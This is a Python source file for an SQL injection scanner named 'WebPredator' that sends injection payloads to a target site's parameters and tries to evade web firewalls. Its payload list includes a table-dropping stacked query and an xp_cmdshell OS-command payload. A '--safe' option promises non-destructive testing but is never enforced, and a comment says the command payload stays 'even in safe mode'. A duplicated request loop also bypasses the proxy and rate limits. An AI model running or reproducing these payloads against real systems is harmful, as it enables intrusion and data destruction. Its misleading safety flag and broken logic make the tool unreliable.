#!/usr/bin/env python3

"""
WebPredator SQL Scanner - Advanced SQL Injection Detection Tool
Next-generation SQL injection detection with evasion techniques
"""

import os
import re
import sys
import json
import time
import random
import socket
import argparse
import requests
from tqdm import tqdm
from datetime import datetime
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
# Added advanced modules
import hashlib
import logging
import locale
import platform
import subprocess
from collections import defaultdict

# Core Configuration
VERSION = "1.0.1"
AUTHOR = "Chico Hacker3108"
BANNER = f"""
    __          __  ______                __ 
   / /_  ____  / /_/ ____/___  ____  ____/ /_
  / __ \/ __ \/ __/ /   / __ \/ __ \/ __  __/
 / /_/ / /_/ / /_/ /___/ /_/ / / / / / / /_  
/_.___/\____/\__/\____/\____/_/ /_/\__/\__/  

Advanced SQL Injection Scanner v{VERSION}
"""

class SecurityShieldDetector:
    """Advanced security shield detection and evasion"""
    SHIELD_SIGNATURES = {
        'CloudShield': (r'cloudshield', r'cs-protect'),
        'DefenseMatrix': (r'defensematrix', r'dm-wall'),
        'GuardianX': (r'guardianx', r'gx-firewall'),
        'IronGate': (r'irongate', r'ig-protect')
    }
    
    def __init__(self, target):
        self.target = target
        self.detected_shield = None
        self.evasion_methods = []
    
    def detect(self):
        """Detect security shields in place"""
        try:
            response = requests.get(
                self.target, 
                headers={'User-Agent': self._random_agent()},
                timeout=10
            )
            
            headers = str(response.headers).lower()
            content = response.text.lower()

            for shield, signatures in self.SHIELD_SIGNATURES.items():
                if any(re.search(sig.lower(), headers) for sig in signatures):
                    self.detected_shield = shield
                    self._prepare_evasion()
                    return shield

            if "access denied" in content or "security violation" in content:
                self.detected_shield = "Generic Security Shield"
                self._prepare_evasion()
            
            return self.detected_shield
        
        except Exception as e:
            print(f"[!] Shield detection error: {e}")
            return None
    
    def _prepare_evasion(self):
        """Prepare appropriate evasion techniques"""
        if self.detected_shield == "CloudShield":
            self.evasion_methods = [
                'delay=4-6',
                'randomize-agent',
                'chunked-encoding'
            ]
        else:
            self.evasion_methods = [
                'delay=2-3',
                'rotate-agents',
                'fuzz-encoding'
            ]
    
    def _random_agent(self):
        """Generate random user agent"""
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        ]
        return random.choice(agents)

class ThreatIntelligence:
    """Integrated threat intelligence module"""
    def __init__(self):
        self.api_keys = {
            'threatbook': os.getenv('THREATBOOK_API'),
            'abuseipdb': os.getenv('ABUSEIPDB_API')
        }
    
    def check_ip_threat(self, ip):
        """Check IP reputation with threat intelligence"""
        if not self.api_keys['threatbook']:
            return None
            
        url = f"https://api.threatbook.io/v1/ip/{ip}"
        params = {'apikey': self.api_keys['threatbook']}
        
        try:
            response = requests.get(url, params=params, timeout=5)
            return response.json() if response.status_code == 200 else None
        except Exception:
            return None
    
    def check_abuse_score(self, ip):
        """Check AbuseIPDB score"""
        if not self.api_keys['abuseipdb']:
            return None
            
        url = "https://api.abuseipdb.com/api/v2/check"
        headers = {'Key': self.api_keys['abuseipdb'], 'Accept': 'application/json'}
        
        try:
            response = requests.get(url, headers=headers, params={'ipAddress': ip}, timeout=5)
            return response.json() if response.status_code == 200 else None
        except Exception:
            return None

class SmartOptimizer:
    """AI-powered optimization engine"""
    def __init__(self):
        self.learning_rate = 0.15
        self.last_response = 0
        self.success_rate = 0
    
    def analyze_response(self, response_time, success):
        """Adaptive learning from responses"""
        if success:
            self.success_rate = min(1.0, self.success_rate + 0.05)
            if response_time < self.last_response * 0.85:
                self.learning_rate *= 1.1
        else:
            self.success_rate = max(0.0, self.success_rate - 0.03)
        
        self.last_response = response_time
    
    def generate_payload(self, base_payload):
        """Generate optimized payload"""
        variations = [
            base_payload,
            f"{base_payload}--",
            f"{base_payload}/*",
            f"1{base_payload}1"
        ]
        return random.choice(variations) if random.random() < self.learning_rate else base_payload

class ScanReport:
    """Comprehensive scan reporting"""
    def __init__(self):
        self.findings = []
        self.start_time = datetime.now()
        self.meta = {
            'tool': 'WebPredator SQL Scanner',
            'version': VERSION
        }
    
    def add_vulnerability(self, url, param, technique, evidence):
        """Record vulnerability finding"""
        self.findings.append({
            'timestamp': datetime.now().isoformat(),
            'url': url,
            'parameter': param,
            'type': technique,
            'evidence': evidence[:500] + '...' if len(evidence) > 500 else evidence,
            'severity': 'high'
        })
    
    def generate(self, format='json'):
        """Generate report in specified format"""
        report_data = {
            'metadata': self.meta,
            'findings': self.findings,
            'stats': {
                'total_findings': len(self.findings),
                'scan_duration': str(datetime.now() - self.start_time)
            }
        }
        
        if format == 'json':
            filename = f"wp_report_{self.start_time.strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(report_data, f, indent=2)
            return filename
        
        elif format == 'html':
            return self._generate_html(report_data)
        
        return None
    
    def _generate_html(self, data):
        """Generate interactive HTML report"""
        html_template = f"""
<!DOCTYPE html>
<html>
<head>
    <title>WebPredator Scan Report</title>
    <style>
        body {{ font-family: 'Segoe UI', sans-serif; line-height: 1.6; color: #333; }}
        .vuln-card {{ border: 1px solid #e1e1e1; border-radius: 8px; padding: 15px; margin-bottom: 15px; }}
        .severity-high {{ border-left: 4px solid #e74c3c; }}
        .evidence {{ background: #f8f9fa; padding: 10px; border-radius: 4px; font-family: monospace; }}
        .summary {{ background: #eaf7fd; padding: 20px; border-radius: 8px; margin-bottom: 20px; }}
    </style>
</head>
<body>
    <h1>WebPredator SQL Injection Report</h1>
    <div class="summary">
        <h2>Scan Summary</h2>
        <p><strong>Scan Date:</strong> {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p><strong>Duration:</strong> {data['stats']['scan_duration']}</p>
        <p><strong>Findings:</strong> {data['stats']['total_findings']}</p>
    </div>
    <h2>Vulnerabilities Detected</h2>
"""
        for finding in data['findings']:
            html_template += f"""
    <div class="vuln-card severity-{finding['severity']}">
        <h3>{finding['type']}</h3>
        <p><strong>URL:</strong> {finding['url']}</p>
        <p><strong>Parameter:</strong> <code>{finding['parameter']}</code></p>
        <p><strong>Evidence:</strong></p>
        <div class="evidence">{finding['evidence']}</div>
        <p><small>Detected at: {finding['timestamp']}</small></p>
    </div>
"""
        html_template += """
</body>
</html>
"""
        filename = f"wp_report_{self.start_time.strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w') as f:
            f.write(html_template)
        return filename

class SQLInjectionScanner:
    """Main scanning engine"""
    def __init__(self, target, threads=5):
        self.safe_mode = False
        self.enable_xss = False
        self.session = None  # Will be injected from main if provided
        self.rate_limit = 0
        self.timeout = 10
        self.output_path = None
        self.target = target
        self.shield_detector = SecurityShieldDetector(target)
        self.threat_intel = ThreatIntelligence()
        self.optimizer = SmartOptimizer()
        self.reporter = ScanReport()
        self.thread_pool = ThreadPoolExecutor(max_workers=threads)
        self.vulnerable = False
    
    def run_scan(self):
        """Execute complete scanning process"""
        print(BANNER)
        print(f"[*] Initializing scan against: {self.target}")
        
        # Security shield detection
        shield = self.shield_detector.detect()
        if shield:
            print(f"[+] Security shield detected: {shield}")
            print(f"[*] Applying evasion: {', '.join(self.shield_detector.evasion_methods)}")
        
        # Threat intelligence check
        self._check_threat_intel()
        
        # Parameter testing
        params = self._discover_parameters()
        print(f"[*] Testing {len(params)} input parameters")
        
        # Concurrent scanning
        futures = []
        for param in tqdm(params, desc="Testing parameters"):
            futures.append(self.thread_pool.submit(self._test_parameter, param))
        
        for future in futures:
            future.result()
        
        # Generate report
        if self.vulnerable:
            report_file = self.reporter.generate('html')
            if getattr(self, 'output_path', None):
                try:
                    os.replace(report_file, self.output_path)
                    report_file = self.output_path
                except Exception:
                    pass
            print(f"\n[+] Scan complete. Vulnerabilities found! Report saved to {report_file}")
        else:
            print("\n[-] No SQL injection vulnerabilities detected")
    
    def _check_threat_intel(self):
        """Check target against threat intelligence"""
        domain = urlparse(self.target).netloc
        try:
            ip = socket.gethostbyname(domain)
            print(f"[*] Target IP: {ip}")
            
            # ThreatBook check
            threat_data = self.threat_intel.check_ip_threat(ip)
            if threat_data:
                print(f"[*] Threat score: {threat_data.get('data', {}).get('score', 'unknown')}")
            
            # AbuseIPDB check
            abuse_data = self.threat_intel.check_abuse_score(ip)
            if abuse_data:
                print(f"[*] Abuse confidence: {abuse_data.get('data', {}).get('abuseConfidenceScore', 'unknown')}%")
        
        except Exception as e:
            print(f"[!] Threat intel check failed: {e}")
    
    def _discover_parameters(self):
        """Discover input parameters"""
        try:
            response = self._request(self.target)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            params = set()
            for form in soup.find_all('form'):
                for input_tag in form.find_all('input'):
                    if input_tag.get('name'):
                        params.add(input_tag.get('name'))
            
            return list(params) if params else ['id', 'query', 'search', 'user']
        
        except Exception:
            return ['id', 'user']  # Default parameters
    
    def _test_parameter(self, param):
        """Test parameter for SQL injection (classic, error-based, blind, stacked)"""
        base_payloads = [
            "' OR 1=1--",
            "' AND 1=1--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,version()--",
            "' UNION SELECT md5(1234)--",
            "') OR ('a'='a",
            "\" OR \"1\"=\"1",
            "') WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)#",
        ]
        # OS command payload kept even in safe mode per user request
        base_payloads.append("' EXEC xp_cmdshell('whoami')--")
        # Additional stacked queries / comment injections
        base_payloads.extend([
            "';DROP TABLE users;--",
            "'/*!50000UNION*/ SELECT 'attacked'--",
        ])

        # Begin payload testing loop
        for payload in base_payloads:
            optimized_payload = self.optimizer.generate_payload(payload)
            try:
                start_time = time.time()
                response = self._request(
                    self.target,
                    params={param: optimized_payload},
                    headers={'User-Agent': self.shield_detector._random_agent()}
                )
                duration = time.time() - start_time
                # Time-based blind detection: if duration significant and 200 OK
                if duration > 4 and response.status_code == 200:
                    self.vulnerable = True
                    evidence = f"Blind payload: {optimized_payload} (response time {duration:.2f}s)"
                    self.reporter.add_vulnerability(self.target, param, "Blind SQLi", evidence)
                    print(f"[!] Blind SQLi on {param} (delay {duration:.2f}s)")
                    break

                if self._is_positive_response(response):
                    self.vulnerable = True
                    evidence = (
                        f"Payload: {optimized_payload}\n"
                        f"Response Code: {response.status_code}\n"
                        f"Response Sample: {response.text[:200]}"
                    )
                    self.reporter.add_vulnerability(self.target, param, "SQL Injection", evidence)
                    print(f"[!] Vulnerable parameter: {param}")
                    break
            except Exception as e:
                print(f"[!] Error testing {param}: {e}")
        

            optimized_payload = self.optimizer.generate_payload(payload)
            
            try:
                start_time = time.time()
                response = requests.get(
                    self.target,
                    params={param: optimized_payload},
                    headers={'User-Agent': self.shield_detector._random_agent()},
                    timeout=10
                )
                response_time = time.time() - start_time
                
                if self._is_positive_response(response):
                    self.vulnerable = True
                    evidence = f"Payload: {optimized_payload}\nResponse Code: {response.status_code}\nResponse Sample: {response.text[:200]}"
                    self.reporter.add_vulnerability(self.target, param, "SQL Injection", evidence)
                    print(f"[!] Vulnerable parameter: {param}")
                    self.optimizer.analyze_response(response_time, True)
                    break
                else:
                    self.optimizer.analyze_response(response_time, False)
            
            except Exception as e:
                print(f"[!] Error testing {param}: {e}")
    
    def _is_positive_response(self, response):
        """Determine if response indicates vulnerability"""
        indicators = [
            "sql syntax",
            "unclosed quotation",
            "database error",
            "unexpected end of SQL command",
            "syntax error"
        ]
        return any(indicator in response.text.lower() for indicator in indicators)

    def _request(self, url, **kwargs):
        """Unified GET request with rate limiting & session support"""
        if self.rate_limit:
            now = time.time()
            elapsed = now - getattr(self, "_last_request", 0)
            wait = max(0, 1.0 / self.rate_limit - elapsed)
            if wait:
                time.sleep(wait)
            self._last_request = time.time()
        kwargs.setdefault("timeout", self.timeout)
        if self.session:
            return self.session.get(url, **kwargs)
        return requests.get(url, **kwargs)

def main():
    parser = argparse.ArgumentParser(
        description="WebPredator SQL Scanner - Advanced SQL Injection Detection",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL to scan")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads")
    parser.add_argument("--threat-check", action="store_true", help="Enable threat intelligence checks")
    parser.add_argument("--html-report", action="store_true", help="Generate HTML report")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP request timeout (seconds)")
    parser.add_argument("--rate-limit", type=int, default=0, help="Maximum requests per second (0 = unlimited)")
    parser.add_argument("--proxy", help="HTTP proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification")
    parser.add_argument("--output", help="Write scan report to specified file path")
    parser.add_argument("--log", choices=["text", "json"], default="text", help="Logging format")
    parser.add_argument("--safe", action="store_true", help="Enable safe mode (non-destructive payloads)")
    parser.add_argument("--xss", action="store_true", help="Enable basic XSS tests")
    parser.add_argument("--self-update", action="store_true", help="Self-update to latest version")
    parser.add_argument("--syslog", action="store_true", help="Send critical logs to syslog/EventLog")
    
    args = parser.parse_args()

    # Logger initialization
    logger = logging.getLogger("webpredator")
    logger.setLevel(logging.INFO)
    handler = logging.StreamHandler(sys.stdout)
    if args.log == "json":
        formatter = logging.Formatter('{"time":"%(asctime)s","level":"%(levelname)s","msg":"%(message)s"}')
    else:
        formatter = logging.Formatter("[%(levelname)s] %(message)s")
    handler.setFormatter(formatter)
    logger.addHandler(handler)

    # SHA256 checksum display
    try:
        with open(__file__, "rb") as f:
            sha256 = hashlib.sha256(f.read()).hexdigest()
            logger.info(f"Binary SHA256: {sha256}")
    except Exception:
        pass

    # Self-update placeholder
    if args.self_update:
        logger.info("[self-update] Checking for updates… (stub)")
        # Here we could fetch GitHub release; placeholder only

    if args.syslog and platform.system() != "Windows":
        try:
            import logging.handlers
            syslog_handler = logging.handlers.SysLogHandler(address='/dev/log')
            syslog_handler.setFormatter(formatter)
            logger.addHandler(syslog_handler)
        except Exception:
            logger.warning("Cannot attach syslog handler")

    # Auto threads if 0
    if args.threads == 0:
        args.threads = (os.cpu_count() or 2) * 2

    # Prepare reusable HTTP session
    session = requests.Session()
    session.verify = not args.insecure
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}

    # Rate limit helper value will be attached to scanner
    
    scanner = SQLInjectionScanner(args.url, args.threads)
    scanner.safe_mode = args.safe
    scanner.enable_xss = args.xss
    # inject enhancements
    scanner.session = session
    scanner.rate_limit = args.rate_limit
    scanner.timeout = args.timeout
    scanner.output_path = args.output
    scanner.run_scan()

if __name__ == "__main__":
    main()